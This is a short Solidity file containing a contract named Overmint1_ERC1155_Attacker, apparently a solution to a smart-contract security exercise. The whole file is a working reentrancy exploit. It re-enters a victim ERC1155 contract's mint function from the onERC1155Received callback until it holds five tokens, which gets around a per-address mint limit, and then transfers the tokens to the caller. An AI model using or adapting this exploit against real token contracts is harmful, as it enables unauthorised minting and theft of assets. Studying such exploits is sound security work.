// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IERC1155Modified is IERC1155 {
    function mint(uint256 id, bytes calldata data) external;
}

contract Overmint1_ERC1155_Attacker {
    IERC1155Modified public victimContract;

    constructor(address _victimContract) {
        victimContract = IERC1155Modified(_victimContract);
    }

    function attack() public {
        victimContract.mint(0, "");
        victimContract.safeTransferFrom(address(this), msg.sender, 0, 5, "");
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        external
        returns (bytes4)
    {
        require(msg.sender == address(victimContract), "Not from victim contract");
        if (victimContract.balanceOf(address(this), 0) < 5) {
            victimContract.mint(0, "");
        }

        return IERC1155Receiver.onERC1155Received.selector;
    }
}
